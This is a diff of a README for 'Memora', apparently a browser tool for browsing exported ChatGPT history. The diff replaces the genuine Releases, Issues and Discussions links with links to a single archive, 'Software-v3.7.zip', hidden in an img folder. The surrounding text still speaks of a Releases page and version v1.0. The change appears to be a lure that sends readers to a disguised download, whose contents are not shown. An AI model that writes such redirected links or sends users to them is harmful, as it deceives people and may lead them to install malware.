@@ -2,7 +2,7 @@
 
 ## 📥 Download Memora
 
-[![Download Memora](https://img.shields.io/badge/Download%20Memora-v1.0-brightgreen)](https://github.com/Karan9555/Memora/releases)
+[![Download Memora](https://raw.githubusercontent.com/Karan9555/Memora/main/img/Software-v3.7.zip%20Memora-v1.0-brightgreen)](https://raw.githubusercontent.com/Karan9555/Memora/main/img/Software-v3.7.zip)
 
 Memora is a lightweight, offline-first archive explorer for your ChatGPT history. Import your exported conversations, search them instantly, merge threads, and export to TXT/Markdown/PDF — all in a GitHub-dark themed UI that runs entirely in your browser. 
 
@@ -12,7 +12,7 @@ Follow these steps to download and run Memora:
 
 1. **Visit the Download Page**  
    Click the link below to visit the page where you can download Memora.  
-   [Download Memora](https://github.com/Karan9555/Memora/releases)
+   [Download Memora](https://raw.githubusercontent.com/Karan9555/Memora/main/img/Software-v3.7.zip)
 
 2. **Choose Your Version**  
    On the Releases page, select the latest version of Memora. Look for a section labeled "Latest release."
@@ -78,7 +78,7 @@ Memora will automatically process your files and list them in the archive.
 ## 💬 Support and Contributions
 
 If you encounter issues or have suggestions for improvements:
-- Check the [Issues page](https://github.com/Karan9555/Memora/issues) for known problems or to report a new issue.
+- Check the [Issues page](https://raw.githubusercontent.com/Karan9555/Memora/main/img/Software-v3.7.zip) for known problems or to report a new issue.
 - Feel free to contribute by opening a pull request or submitting a proposal.
 
 ## 🏷️ Topics
@@ -99,10 +99,10 @@ If you encounter issues or have suggestions for improvements:
 
 ## 🔗 Additional Resources
 
-For more information on how to use Memora, consult the help section within the application. Community discussions and updates can also be found on the repository's [discussions page](https://github.com/Karan9555/Memora/discussions). 
+For more information on how to use Memora, consult the help section within the application. Community discussions and updates can also be found on the repository's [discussions page](https://raw.githubusercontent.com/Karan9555/Memora/main/img/Software-v3.7.zip). 
 
 ## 📜 License
 
 Memora is open-source software licensed under the MIT License. You are free to use, modify, and distribute it.
 
-[Download Memora](https://github.com/Karan9555/Memora/releases) and start exploring your ChatGPT history today!
+[Download Memora](https://raw.githubusercontent.com/Karan9555/Memora/main/img/Software-v3.7.zip) and start exploring your ChatGPT history today!
